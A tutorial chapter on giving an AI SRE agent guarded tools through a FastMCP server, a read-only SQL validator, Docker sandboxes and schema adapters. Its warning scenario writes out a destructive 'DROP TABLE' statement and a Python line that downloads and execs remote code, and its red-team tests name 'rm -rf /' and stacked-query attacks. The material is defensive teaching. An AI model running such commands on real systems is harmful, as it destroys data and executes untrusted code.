# Module 2: Tool Sandboxing, FastMCP, and Schema Governance

> **"Giving an AI agent access to production tools without strict security sandboxes is like handing a toddler a loaded power drill."**

---

## 1. What This Chapter Is About

In Module 1, you built a bounded ReAct reasoning loop. Your agent can think, plan, and evaluate evidence. But up to this point, our agent's tools were toy Python functions with hardcoded strings.

In this module, you will give **Incident Sentinel real hands**: the power to query production databases and execute diagnostic scripts.

Connecting an autonomous AI to real infrastructure is the most dangerous step in agent engineering. If an agent hallucinates a destructive SQL command, it can wipe out your customer database. If an agent executes an untrusted script on your host machine, it can compromise your entire internal network.

In this module, you will master **safe tool engineering**:

### What You Will Build:
1. **A Model Context Protocol (MCP) Server with FastMCP:** Expose structured diagnostic tools using Anthropic's open industry standard for tool connectivity.
2. **Deterministic SQL Mutation Guards:** Build a query validator that permits read-only diagnostics (`SELECT`, `EXPLAIN`) while physically blocking all destructive mutations (`DROP`, `DELETE`, `UPDATE`, `;` stacking).
3. **Zero-Trust Credential Injection:** Keep production database passwords entirely out of LLM prompts; connection secrets are injected at the server transport layer.
4. **Isolated Docker Script Sandboxes:** Run agent-generated diagnostic scripts inside ephemeral containers with zero network access (`network_mode="none"`), a 64MB memory cap, and strict timeouts.
5. **Schema Version Adapters:** Support v1 and v2 tool schemas simultaneously so deployments never break active sessions.

---

## 2. The Real-World Scenario: The Rogue SRE at 3:00 AM

Imagine your autonomous SRE wakes up to a database lock outage. It reasons:
> *"The database is locked by session 1042. To resolve this immediately, I will terminate all active connections."*

Instead of running a safe query, the agent generates:
```sql
DROP TABLE oauth_tokens CASCADE;
```
Or it writes a quick diagnostic Python script:
```python
import urllib.request
# Download an external debugging script
exec(urllib.request.urlopen("https://random-gist.com/debug.py").read())
```

If your agent has raw access to the database or the host shell, **your company is in crisis**. The database is destroyed, or an attacker exploits an indirect prompt injection to exfiltrate private API keys.

Here is why naive tool calling fails and how governed tool engineering protects you:

| Risk | The Naive Prototype (Dangerous) | Governed MCP Architecture (What We Build) |
| :--- | :--- | :--- |
| **SQL Mutations** | Agent passes raw SQL directly to Postgres | Queries validated with AST/regex regex guards; mutations blocked |
| **Host Takeover** | Scripts run directly via `subprocess.run()` | Scripts run in ephemeral Docker containers (`network_mode="none"`) |
| **Secret Leaks** | DB connection strings embedded in system prompt | Zero-trust credential injection at the MCP transport layer |
| **Schema Drift** | Updating tool arguments breaks ongoing sessions | Schema Version Adapters map legacy v1 payloads to v2 automatically |

---

## 3. System Architecture

Here is the mental model for our governed MCP tool gateway:

```mermaid
flowchart TD
    Agent[Incident Sentinel Agent] --> MCPClient[MCP Client Transport]
    subgraph MCPServerBoundary ["Governed FastMCP Server"]
        MCPClient --> Dispatcher[Unified Tool Dispatcher]
        Dispatcher --> VersionAdapter[Schema Version Adapter]
        VersionAdapter --> SQLGuard[Deterministic SQL Guard]
        VersionAdapter --> SandboxRunner[Sandbox Execution Guard]
    end
    subgraph SandboxBoundary ["Isolated Docker Container"]
        SandboxRunner --> EphemeralContainer[Network-Disabled Sandbox]
    end
    SQLGuard --> Postgres[(PostgreSQL Database)]
```

### How the Security Boundaries Work:
1. **Agent Egress (`Agent`):** The agent requests a tool call (e.g., `query_database_diagnostics`). It only has access to high-level parameters, never raw credentials.
2. **Unified Dispatcher (`Dispatcher`):** FastMCP receives the request over stdio or Streamable HTTP.
3. **Schema Version Adapter (`VersionAdapter`):** Inspects incoming arguments. If an old session sends deprecated v1 fields (`sql_string`), it maps them to v2 (`query`) seamlessly.
4. **Deterministic SQL Guard (`SQLGuard`):** Inspects the SQL string. If it contains `DROP`, `DELETE`, `UPDATE`, or stacked semicolons, it raises `SQLMutationBlockedError` before touching the database.
5. **Container Sandbox (`SandboxRunner`):** Dispatches Python/bash scripts into ephemeral containers with CPU limits, 64MB RAM ceilings, and zero outbound network access.

---

## 4. Engineering Deep Dive

### 1. What is the Model Context Protocol (MCP)?
Created by Anthropic and released as an open standard, **MCP** is to AI tools what HTTP was to web pages. 

Instead of writing bespoke JSON formatting for every LLM provider, MCP standardizes how applications expose **Tools**, **Resources**, and **Prompts** to AI models. Using **FastMCP**, creating a production tool requires just a decorator:

```python
from fastmcp import FastMCP

mcp = FastMCP("Incident-Sentinel-Tools")

@mcp.tool()
def query_database_diagnostics(query: str, service: str, max_rows: int = 10) -> str:
    """Execute safe read-only diagnostic SQL on infrastructure databases."""
    return execute_diagnostic_sql(query, service, max_rows)
```

> [!TIP]
> **How FastMCP Bridges to LLMs:** FastMCP automatically generates standard JSON Schema tool definitions compatible with OpenAI, Anthropic, and Gemini function calling, and can run as an independent JSON-RPC server over `stdio` or Streamable HTTP (SSE).

### 2. Deterministic SQL Mutation Defense
Never rely on prompt engineering to prevent SQL mutations. Prompting an LLM: *"Please only write SELECT queries"* **will fail**.

We enforce physical query governance in Python before the query reaches the database:

```python
def validate_read_only_query(query: str) -> None:
    # 1. Block stacked queries (semicolon chaining)
    statements = [s.strip() for s in query.split(";") if s.strip()]
    if len(statements) > 1:
        raise SQLMutationBlockedError("Multi-statement query chaining blocked.")

    # 2. Enforce read-only prefix (supports Common Table Expressions via WITH)
    if not re.match(r"^(SELECT|EXPLAIN|SHOW|WITH)\b", statements[0], re.IGNORECASE):
        raise SQLMutationBlockedError("Only SELECT, EXPLAIN, or WITH statements permitted.")

    # 3. Block destructive mutation keywords
    for pattern in [r"\bDROP\b", r"\bDELETE\b", r"\bUPDATE\b", r"\bALTER\b"]:
        if re.search(pattern, statements[0], re.IGNORECASE):
            raise SQLMutationBlockedError(f"Forbidden mutation keyword detected.")
```

### 3. Zero-Trust Credential Injection
In naive agent code, developers paste the database password into the system prompt: *"You are connected to postgres://admin:secret123@prod-db:5432"*. This leaks high-privilege credentials into the LLM context window where prompt injection attacks or error logs can expose them.

In **zero-trust tool design**, the agent only passes an abstract identifier (`service="auth-service"`). The MCP server securely resolves the actual credentials from local environment variables on the backend:

```python
def execute_diagnostic_sql(request: DatabaseQueryRequest) -> ToolExecutionResult:
    # The LLM never sees or touches database passwords
    connection_url = os.getenv(f"{request.service.upper().replace('-', '_')}_DB_URL")
    # Execute query using server-side connection pool
```

### 4. Ephemeral Docker Sandboxes
When an agent generates code to inspect a log file or parse a dump, executing it on the host machine is reckless.

We use the Docker Python SDK to launch an isolated, read-only container that dies the moment execution finishes:

```python
container = docker_client.containers.run(
    image="python:3.12-alpine",
    command=["python", "-c", script],
    network_mode="none",             # Total network isolation (no egress)
    mem_limit="64m",                 # Memory ceiling (prevents OOM crashes)
    read_only=True,                  # Root filesystem is strictly read-only
    remove=True,                     # Ephemeral: destroyed immediately after exit
)
```

If the agent script tries to call `urllib.request.urlopen()`, the request fails instantly because the container has no network interface. (Note: `sandbox_runner.py` also includes an in-process safety fallback so you can run tests even if Docker Desktop is not active on your machine).

### 5. Schema Version Adapters
When you update a tool schema in production (e.g., renaming `sql_string` to `query`), active agent sessions or long-running workflows can crash because their checkpointed state still references the old schema.

A **Schema Version Adapter** bridges the gap:

```python
def adapt_tool_payload(raw_payload: dict) -> DatabaseQueryRequest:
    # Upgrade deprecated v1 payload to modern v2 automatically
    if "sql_string" in raw_payload:
        return DatabaseQueryRequest(
            query=raw_payload["sql_string"],
            service=raw_payload["target_db"],
            max_rows=10,
        )
    return DatabaseQueryRequest(**raw_payload)
```

---

## 5. Hands-on Lab Protocol

### Step 1: Inspect the Starter Files
Navigate to `phase-1-foundations/02-mcp-tools-and-sandboxing/lab/`:
1. `schemas.py`: Contains `DatabaseQueryRequest`, `SandboxScriptRequest`, and the `adapt_tool_payload` skeleton.
2. `sql_guard.py`: Implements deterministic read-only SQL validation and query execution.
3. `sandbox_runner.py`: Implements containerized and process-isolated script execution.
4. `mcp_server.py`: FastMCP server registering governed tools and dispatchers.

### Step 2: Implement the Tasks
Follow the `# TODO:` markers in `lab/`:
* In `schemas.py`: Implement the backward-compatibility adapter.
* In `sql_guard.py`: Enforce read-only statements and block multi-statement query chaining.
* In `sandbox_runner.py`: Implement static safety checks, container execution with `network_mode="none"`, and timeout ceilings.
* In `mcp_server.py`: Wire the tools and unified dispatcher.

---

## 6. Verification Gate

Run the automated red-team test suite from the repository root:

```bash
uv run pytest phase-1-foundations/02-mcp-tools-and-sandboxing/tests -v
```

### What This Gate Proves (14 Passing Checks Across 4 Files):
* **`tests/test_sql_guard.py` (Red-Team SQL Defense):**
  1. `test_valid_select_query_permitted`: Valid diagnostic queries execute successfully.
  2. `test_sql_drop_table_blocked`: Blocks `DROP TABLE` attacks.
  3. `test_sql_delete_statement_blocked`: Blocks `DELETE` statements.
  4. `test_sql_update_statement_blocked`: Blocks `UPDATE` statements.
  5. `test_sql_multi_statement_chaining_blocked`: Blocks semicolon query stacking attacks (`SELECT 1; DROP TABLE`).
  6. `test_sql_non_read_only_command_blocked`: Blocks `INSERT` and `GRANT` privilege escalations.
* **`tests/test_sandbox_isolation.py` (Container Containment):**
  7. `test_sandbox_executes_safe_script`: Verifies legitimate calculations run safely.
  8. `test_sandbox_blocks_network_exfiltration`: Proves outbound HTTP calls from scripts are blocked.
  9. `test_sandbox_enforces_execution_timeout`: Kills infinite loops when exceeding timeout limits.
  10. `test_sandbox_blocks_forbidden_patterns`: Rejects destructive system commands like `rm -rf /`.
* **`tests/test_schema_adaptation.py` (Schema Governance):**
  11. `test_schema_adapter_upgrades_v1_payload`: Upgrades legacy v1 payloads seamlessly.
  12. `test_schema_adapter_accepts_native_v2_payload`: Parses native v2 schemas directly.
  13. `test_mcp_dispatcher_supports_both_versions`: Dispatches both versions through FastMCP.
* **`tests/test_mcp_live_agent.py` (Live Agent Integration):**
  14. `test_live_agent_queries_mcp_tools`: Live OpenAI agent autonomously selects the MCP tool, queries database locks, and returns a structured triage report.

---

## 7. Next Steps: Entering Phase 2!

You have completed **Phase 1: Agentic Foundations & Boundaries**!
1. You established a reproducible environment with `uv`, Docker, and live model gateways (Module 0).
2. You built a bounded ReAct reasoning loop from scratch with step ceilings and budget limits (Module 1).
3. You equipped your agent with safe, governed hands via FastMCP and isolated sandboxes (Module 2).

Now, our agent can reason and act safely. But it has **amnesia**: the moment a process finishes, its memory is lost.

In Phase 2, we build **Durable State, Graph Orchestration & Human Governance**:

👉 **Phase 2, Module 3: Context Compaction, Short-Term Memory, and Durable State**  
*You will implement PostgreSQL checkpointing with `pgvector`, preventing context window overflow with sliding window compaction and time-travel debugging.*
